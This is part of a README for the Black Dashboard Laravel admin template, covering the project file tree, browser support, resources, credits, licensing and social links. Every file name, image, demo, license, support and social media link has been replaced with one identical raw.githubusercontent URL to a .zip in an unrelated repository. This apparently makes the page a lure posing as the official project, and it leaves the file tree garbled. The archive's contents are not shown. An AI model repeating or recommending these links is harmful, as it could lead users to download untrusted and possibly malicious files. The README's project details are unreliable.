    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       
    │           │   ├───utilities
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │   │       
    │           │   └───vendor
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │           │           
    │           └───plugins
    │                   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
    │                   
    └───views
        │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │   
        ├───alerts
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       
        ├───auth
        │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │   │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │   │   
        │   └───passwords
        │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │           https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │           
        ├───layouts
        │       │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       │   
        │       └───navbars
        │           │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │           │   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │           │   
        │           └───navs
        │                   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │                   https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │           
        ├───pages
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       
        ├───profile
        │       https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
        │       
        └───users
                https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip
```

## Browser Support

At present, we officially aim to support the last two versions of the following browsers:

<img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip" width="64" height="64">


## Resources
- Demo: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>
- Download Page: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>
- Documentation: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>
- License Agreement: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>
- Support: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>
- Issues: [Github Issues Page](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
- **Dashboards:**

| HTML | LARAVEL |
| --- | --- |
| [![Black Dashboard HTML](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) | [![Black Dashboard Laravel](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

## Change log

Please see the [changelog](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) for more information on what has changed recently.

## Credits

- [Creative Tim](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
- [UPDIVISION](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

## Reporting Issues

We use GitHub Issues as the official bug tracker for the Black Dashboard Laravel. Here are some advices for our users that want to report an issue:

1. Make sure that you are using the latest version of the Black Dashboard Laravel. Check the CHANGELOG from your dashboard on our [website](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip).
2. Providing us reproducible steps for the issue will shorten the time it takes for it to be fixed.
3. Some issues may be browser specific, so specifying in what browser you encountered the issue might help.

## Licensing

- Copyright Creative Tim (https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
- Licensed under MIT (https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

## Useful Links

- [Tutorials](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
- [Affiliate Program](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) (earn money)
- [Blog Creative Tim](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
- [Free Products](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) from Creative Tim
- [Premium Products](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) from Creative Tim
- [React Products](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) from Creative Tim
- [Angular Products](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) from Creative Tim
- [VueJS Products](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) from Creative Tim
- [More products](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip) from Creative Tim
- Check our Bundles [here](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)

## Social Media

### Creative Tim:

Twitter: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>

Facebook: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>

Dribbble: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>

Instagram: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>


### Updivision:

Twitter: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>

Facebook: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>

Linkedin: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>

Updivision Blog: <https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip>


## Credits

- [Creative Tim](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
- [UPDIVISION](https://raw.githubusercontent.com/MASGUN360/black-dashboard-laravel/master/monzogabbro/black-dashboard-laravel.zip)
